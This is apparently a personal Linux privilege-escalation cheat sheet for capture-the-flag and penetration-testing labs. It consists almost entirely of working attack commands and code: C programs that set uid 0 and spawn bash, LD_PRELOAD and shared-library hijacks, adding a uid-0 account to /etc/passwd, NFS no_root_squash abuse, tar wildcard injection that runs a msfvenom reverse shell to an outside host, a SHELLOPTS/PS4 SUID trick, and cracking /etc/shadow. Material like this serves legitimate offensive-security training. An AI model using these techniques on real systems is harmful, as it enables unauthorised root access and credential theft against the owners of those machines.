-------------------------------------------------------------------------------------
Linux Priv Escaltion   - Hey you have shell no worry !!!, get root 
++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++
=====================================================================================
What's the OS? What version? What architecture?
Who are we? Where are we?
Who uses the box? What users? (And which ones have a valid shell)
What's currently running on the box? What active network services are there?
What's installed? What kernel is being used?
What user files do we have access to?
What configurations do we have access to?
Any incorrect file permissions?
What programs are custom? Any SUID? SGID?
What's scheduled to run?
Any hardcoded credentials? Where are credentials kept?
Any program running as root?
...and many many other questions .


Kernel
++++++++++++++++++++++++++++++++++++++++
searchsploit local kernel 2.6 centos
Cross Compiler
+++++++++++++++++++++++++++++++++++++++++

++++++++++++++++++++++++
services
++++++++++++++++++++++++

search for vnc, tmux, desktop environment
tmux -S /.devs/dev_sess

ps -U root
sockstat -P tcp

tunneling SSH with VNC(5901) 
 ssh -L 5902:localhost:5901 charix@10.10.10.84

++++++++++++++++++++++++++++++++++++++++++   
weak file permission write/sudo/suid
++++++++++++++++++++++++++++++++++++++++++

writtiable ==> $ find /etc -maxdepth 1 -writable -type f
----------     $ find / -writable -type d 2</dev/null
			   $ find / -name *.sh -perm -o+w+x 2>/dev/null
			   $ find / -perm -o+w -type d 2>/dev/null


	/etc/exports --> add /root *(rw,sync,insecure,no_root_squash,no_subtree_check)
                    mount -t nfs -o nfsvers=3 fileservername:/nfssharename /mountpoint_name
                    msfvenom -p linux/x86/exec CMD="/bin/bash -p" -f elf -o /tmp/nfs/shell.elf
                 #include<stdio.h>
				 #include<unistd.h>
				 #include<sys/types.h>
				 int main(){
				 setuid(0);
				 system("/bin/bash -p");
				 return 0; }
				 
		Hacker	cp /bin/nano
			    chmod 4777 nano
		victim  ./nano /etc/shadow
		ref: https://www.hackingarticles.in/linux-privilege-escalation-using-misconfigured-nfs/
		
	/etc/passwd  --> openssl passwd password
                 replace in root:x: 
		add this-> newroot:L9yLGxncbOROc:0:0:root:/root:/bin/bash
				 
	/etc/shadow ----> mkpasswd -m sha-512 newpassword
                  replace root:    :


	/home/root/ ---> create ssh key 
	                 ssh-keygen -t rsa
					 cd /home/root/
					 mkdir .ssh
					 copy the public key and take the SSH -i <priv key> 



++++++++++++++++++++++++++++++++++++++++++
readable 
++++++++++++++++++++++++++++++++++++++++++
			$ find /etc -maxdepth 1 -readable -type f
			$ find / -readable 2<dev/null
	/etc/shadow ----> john --format=sha512crypt --wordlist=rockyou.txt hash.txt


++++++++++++++++++++++++++++++++++++++++++
Sudo premssion   
++++++++++++++++++++++++++++++++++++++++++       
    $ sudo -l
    $ sudo –u <username> <program>
	$ sudo su 
	$ sudo -s
	$ sudo -i
	$ sudo /bin/bash
	$ sudo passwd
	
https://gtfobins.github.io		
https://www.hackingarticles.in/linux-privilege-escalation-using-exploiting-sudo-rights/

++++++++++++++++++++++++++++++++++++++++++	
Sudo - Environment variable
++++++++++++++++++++++++++++++++++++++++++
 if there were no escape sequence, try the env variables -Classic Eg. Appache2, vi, nano, cat ... .
    sudo apache2 -f /etc/shadow
	       *LD_PRELOAD is an environment variable which can be set to the path of a shared object (.so) file.
	if env_keep+=LD_PRELOAD --> present
	    preload.c ---> #include <stdio.h>
					   #include <sys/types.h>
                       #include <stdlib.h>
                       void _init() {
                       unsetenv("LD_PRELOAD");
                       setresuid(0,0,0);
                       system("/bin/bash -p");}
		gcc -fPIC -shared -nostartfiles -o /tmp/preload.so preload.c
		sudo LD_PRELOAD=/tmp/preload.so apache2			   
					   

++++++++++++++++++++++++++++++++++++++++++
Sudo - LD_LIBRARY_PATH
++++++++++++++++++++++++++++++++++++++++++
	ldd /usr/sbin/apache2
			libcrypt.so.1 ---> best to hijack
	
	lib_path.c----->#include <stdio.h>
					#include <stdlib.h>
					static void hijack() __attribute__((constructor));
					void hijack() {
					unsetenv("LD_LIBRARY_PATH");
					setresuid(0,0,0);
					system("/bin/bash -p");}
	gcc -o libcrypt.so.1 -shared -fPIC library_path.c				
	sudo LD_LIBRARY_PATH=. apache2
	
++++++++++++++++++++++++++++++++++++++++++ 	
Cron Jobs
++++++++++++++++++++++++++++++++++++++++++
	$ /var/spool/cron/
	$ /var/spool/cron/crontabs/
	system-wide crontab is located at /etc/crontab.
    $ cat /etc/crontab
	  locate overwrite.sh
By default PATH environment variable is  /usr/bin:/bin
    If a cron job program/script does not use an absolute path, replace the job in the path.
	
++++++++++++++++++++++++++++++++++++++++++
Wildcards
++++++++++++++++++++++++++++++++++++++++++
grep "CRON" /var/log/cron.log <--- idnetify the running job

   if the * present in the cronjob as 
		$ cat /usr/local/bin/compress.sh
		#!/bin/sh
		cd /home/user
		tar czf /tmp/backup.tar.gz *
	check the tar has escapeshell sequence then create the reverse handler and place it in the /home/user
	    msfvenom -p linux/x64/shell_reverse_tcp LHOST=192.168.100.50 LPORT=53 -f elf -o shell.elf
		touch /home/user/--checkpoint=1                        --------|
        touch /home/user/--checkpoint-action=exec=shell.elf   ---------|shell escape sequencece
		
 ref: https://www.hackingarticles.in/exploiting-wildcard-for-privilege-escalation/
 
 
++++++++++++++++++++++++++++++++++++++++++
SUID / SGID
++++++++++++++++++++++++++++++++++++++++++
  SUID files get executed with the privileges of the file owner.
  SGID files get executed with the privileges of the file group.
 command:   $ find / -type f -a \( -perm -u+s -o -perm -g+s \) -exec ls -l {} \; 2> /dev/null
	-> try shell escape sequence as sudo
	-> LD_PRELOAD and LD_LIBRARY_PATH are by defualt disabled of security reason and ignored
	-> Public exploits will be there of SUID eg.., exim-4.84-3
	-> $ sed -e "s/^M//" 39535.sh > privesc.sh
	-> $sed -i 's/\r$//g' 34896.py 
	
Shared Object Injection   <---- IMPORTANT TO Notice (as like missing .dll)
-----------------------
	-> $ strace /usr/local/bin/suid-so 2>&1 | grep -iE "open|access|no such file"
	-> found missing on writteable file, write a shared lib gcc 
	-> run a suid executables
	
PATH environment variable    <--- IMPORTANT TO Notice (missing double quote in registry)
--------------------------
	-> $ strings /path/to/file   (easy to use)
	-> $ strace -v -f -e execve <command> 2>&1 | grep exec
	-> $ ltrace <command> 
			#include <stdio.h>
			#include <stdlib.h>
			int main() {
			setuid(0);
			system("/bin/bash -p");
			}
		gcc -shared -fPIC -o /home/user/.config/libcalc.so libcalc.c
	-> $ PATH=.:$PATH /usr/local/bin/suid-env

Abusing Shell Features (#1)
---------------------------
	-> notably Bash <4.2-048 ---> it is possible to define user functions with an absolute path name. 
	-> /usr/sbin/service appache2 start --> absloute path
	-> $ function /usr/sbin/service { /bin/bash -p; }
	-> $ export -f /usr/sbin/service

Abusing Shell Features (#2)
---------------------------
	-> $ ltrace /usr/local/bin/suid-env 2>&1 | grep service
	-> $ env -i SHELLOPTS=xtrace PS4='$(cp /bin/bash /tmp/rootbash; chown root /tmp/rootbash; chmod +s /tmp/rootbash)' /usr/local/bin/suid-env2



++++++++++++++++++++++++++++++++++++++++++
Passwords & Keys
++++++++++++++++++++++++++++++++++++++++++
	-> /etc/shadow
History
	-> cat ~/.*history | less
	-> cat .bash_history
	-> ls  -al 
Config
	-> /etc/openvpn/auth.txt
SSH Keys
	-> ls -l /.ssh
	-> chmod 600 root_key
		
Search MySql Db password
	-> grep -R '$bigtree\["config"\]\["db"\]' 
	-> find . -name "*sql*"
	-> find . -name "*config*"
	-> try found password for users via ssh
	
++++++++++++++++++++++++++++++++++++++++++	
NFS - Network File System
++++++++++++++++++++++++++++++++++++++++++
	-> showmount -e <target>
	-> nmap –sV –script=nfs-showmount <target>
	-> mount -o rw,vers=2 <target>:<share> <local_directory>
  Root Squashing is how NFS prevents an obvious privilege escalation. aftet mount use the same uid to create user to read content
	-> no_root_squash must there in config /etc/exports
	-> msfvenom -p linux/x86/exec CMD="/bin/bash -p" -f elf -o /tmp/nfs/shell.elf
	->#chmod +xs /tmp/nfs/shell.elf
	->$ /tmp/shell.elf


+++++++++++++++++++++++++++++++++++++++++++++
Search Mode
+++++++++++++++++++++++++++++++++++++++++++++

-> search for any uncommon function, name, file
-> search in exploid-db for privlege escaltions



+++++++++++++++++++++++++++++++++++++++++++++
ref
+++++++++++++++++++++++++++++++++++++++++++++
https://blackwintersecurity.com/


Manual cheatsheets
--------------------
id
hostname
cat /etc/release
lsb_reease -d
ip a
ss -anp / netstat -ano
grep -Hs iptables/etc/*
ls -lah /etc/cron*
dpkg -l -> program list (rpm -l)
mount or cat /etc/fstab or /bin/lsblk
lsmod -> load modules
/sbin/modinfo <mod name> -> info about the modules
